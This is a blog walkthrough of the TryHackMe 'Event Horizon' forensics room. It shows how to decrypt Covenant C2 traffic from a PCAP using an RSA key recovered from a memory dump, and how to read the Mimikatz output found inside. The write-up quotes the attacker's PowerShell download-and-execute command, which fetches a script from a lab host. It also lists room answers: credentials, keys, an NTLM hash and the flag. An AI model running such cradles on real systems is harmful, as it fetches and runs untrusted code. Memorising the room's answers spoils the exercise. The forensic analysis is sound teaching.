---
title: "TryHackMe Event Horizon: Covenant C2 traffic decryption"
date: 2026-11-13T09:15:00+05:30
lastmod: 2026-11-13T09:15:00+05:30
author: Animesh Roy
avatar: /img/avatar.jpeg
authorlink: https://anir0y.in
featureimage: img/thm-eventhorizon/00-thumbnail.png

categories:
  - TryHackMe
tags:
  - tryhackme
  - thm
  - rooms
  - network forensics
  - PCAP analysis
  - Covenant C2
  - AES decryption
  - RSA key recovery
  - Mimikatz
  - credential extraction
  - PowerShell forensics

draft: false
description: "TryHackMe Event Horizon walkthrough: POP3 brute-force recovery, Covenant C2 protocol decryption with RSA key extraction from memory, and Mimikatz SAM dump analysis."
---

| <script src="https://tryhackme.com/badge/434937"></script>| <a class="twitter-follow-button" href="https://twitter.com/anir0y" data-size="large"> Follow @anir0y<a>|
|---|---|
|Event Horizon |![Event Horizon room icon](https://cdn-images.tryhackme.com/room-icons/618b3fa52f0acc0061fb0172-1749651774451)|

Event Horizon is a Hard forensic room that hands you a PCAP and a PowerShell process memory dump from a compromised Windows host. The attack chain runs from POP3 credential brute-force through phishing email delivery, malicious PowerShell download, Covenant C2 staging with RSA key exchange, and finally credential exfiltration via Mimikatz. The cryptographic core of the room is decrypting the C2 traffic: extracting the RSA private key from the memory dump, recovering the negotiated AES session key, and decrypting every Covenant message to find the SAM dump and the flag. If you are working through network forensics rooms, the [Warzone 1 walkthrough](/post/thm-room-warzoneone/) covers a similar PCAP-driven investigation with MirrorBlast C2 traffic.

## Task 1: The Event Horizon

The downloadable evidence consists of two files: `traffic.pcapng` (7.2 MB network capture) and `powershell.DMP` (257.6 MB PowerShell process memory dump from the target Windows machine).

### POP3 brute-force: recovering the email credentials

Filtering the PCAP for POP3 traffic reveals a classic credential brute-force pattern. A single source IP hammers the POP3 service with `USER`/`PASS` pairs, receiving `-ERR` rejections until one attempt returns `+OK`:

```
  USER tom.dom@eventhorizon.thm
  PASS password
  +OK Logged in.
```

The attacker tried multiple username and password combinations before landing on the valid pair. Every failed attempt shows `-ERR [AUTH] Authentication failed.` followed by a new `USER` command, a textbook dictionary attack against the mail service.

**Credentials: tom.dom@eventhorizon.thm:password**

### SMTP email: the phishing message

After gaining access to the mailbox, the attacker sends an email via SMTP. Extracting the SMTP TCP stream reveals a 7-bit plaintext message with a PowerShell script attached:

```
  From: dom.tho@eventhorizon.thm
  To: tom.dom@eventhorizon.thm
  Subject: Discovery!
  Content-Type: multipart/mixed
```

The email body, stripped of MIME headers:

**Tom! I have done it! I have found the mass of the black hole we found! Run this script as the AdministratOr! Your BEst friend DOm**

The unusual capitalization in "AdministratOr" and "BEst friend DOm" is intentional, a social engineering nudge to make the victim run the attachment with elevated privileges.

### Malicious script download

The PCAP shows the victim executing a PowerShell command that downloads and runs a script from the attacker's server:

**IEX(New-Object Net.WebClient).downloadString('http://10.0.2.45/radius.ps1')**

The downloaded `radius.ps1` (7466 bytes) is a Covenant Grunt stager. It contains the initial AES key, the C2 URL, and the logic to perform the RSA key exchange that establishes the encrypted C2 channel.

{{< ad >}}

### Covenant C2 protocol: understanding the traffic

Covenant is a .NET C2 framework that uses HTTP for transport with AES-256-CBC encryption. The protocol has three message types, each identified by a numeric prefix in the POST body:

- **Type 0**: Grunt to server (data upload, task results)
- **Type 1**: Server to Grunt (tasking, key material)
- **Type 2**: Key renegotiation

Every message follows the same wire format: `[GUID][MessageType][IV (16 bytes)][EncryptedMessage][HMAC-SHA256 (32 bytes)]`, all base64-encoded. A critical implementation detail that is not documented anywhere: **Covenant computes the HMAC over the EncryptedMessage bytes only, not over IV+EncryptedMessage** as standard constructions would. Getting this wrong means every HMAC verification fails and you cannot confirm which key decrypts which message.

The initial AES key is embedded in the stager script:

**l86TfRDvvJMtXWxr1PSoh1QlXHnZnLwn+wz+aYy3/s8=**

### RSA key exchange and session key recovery

The C2 channel bootstraps with a key exchange:

1. **Frame 4742 (POST, Type 0, initial key)**: The Grunt sends its RSA public key to the server, encrypted with the initial AES key.
2. **Frame 4745 (Response, Type 1, initial key)**: The server responds with a new AES session key, RSA-encrypted with the Grunt's public key, then wrapped in the initial AES key.

To recover the negotiated session key, you need the RSA private key. It lives in the PowerShell process memory dump as a CNG RSA key blob (BCRYPT_RSAKEY_BLOB). Scanning the dump for the `RSA2` magic bytes (the CNG marker for a full private key) locates a 2048-bit RSA private key with all components (p, q, d, dp, dq, qInv).

Extracting the key and performing PKCS1_OAEP decryption on the 256-byte RSA-encrypted blob from the server's response yields the negotiated session key. All subsequent C2 messages use this key.

### Decrypting the C2 messages

With both keys in hand, every message in the PCAP becomes readable:

- **Frame 4804 (Type 0, negotiated key)**: Grunt registration, sending hostname (`WIN-SKOQ4PBDU0C`), username, OS details, and process information back to the server.
- **Frame 4866 (Type 0)**: Response to a `WhoAmI` tasking, confirming the compromised identity.
- **Frame 6212 (Type 0)**: The Mimikatz SAM dump output, containing local account NTLM hashes.
- **Frame 6826 (Type 0)**: A base64-encoded PNG screenshot of the victim's desktop (exfiltrated with status=2, indicating an in-progress transfer that was truncated).

### Mimikatz SAM dump: the Administrator hash

The decrypted frame 6212 contains Mimikatz's `lsadump::sam` output:

```
  Domain : WIN-SKOQ4PBDU0C
  SysKey : 7d36208750229adfc967b493e2162f60
  Local SID : S-1-5-21-2478979676-3632473970-4217322164

  RID  : 000001f4 (500)
  User : Administrator
    Hash NTLM: 13b1e64400203ecf38b1fdea2b11a09f
```

**Administrator NTLM hash: 13b1e64400203ecf38b1fdea2b11a09f**

### The flag: hidden in the exfiltrated screenshot

The exfiltrated desktop screenshot (frame 6826) was truncated during transfer but still loads partially with PIL's `LOAD_TRUNCATED_IMAGES` mode. The 1920x977 RGBA image shows the victim's desktop wallpaper with the flag printed on it:

**FLAG{ABOVE_AND_B3YOND_THE_EVENT_HORIZON}**

## Takeaways

1. **Covenant's HMAC is non-standard.** The framework computes HMAC-SHA256 over the ciphertext alone, not over IV+ciphertext as AEAD constructions typically do. When reverse-engineering C2 protocols, the HMAC validation is the first gate: if you assume a standard construction and it fails, test alternative data compositions before concluding the key is wrong. In this case, switching from `HMAC(key, IV+CT)` to `HMAC(key, CT)` was the difference between a dead end and full decryption.

2. **CNG key blobs in process memory are a complete private key recovery vector.** The PowerShell process memory dump contained the RSA private key as a BCRYPT_RSAKEY_BLOB with the `RSA2` magic marker, including all CRT components. Memory forensics tools can scan for these markers at scale. In incident response, capturing process memory before killing malware is critical because the key material needed to decrypt the C2 channel may only exist in that process's address space.

Room solved 100%: 1 task, 6 answers.
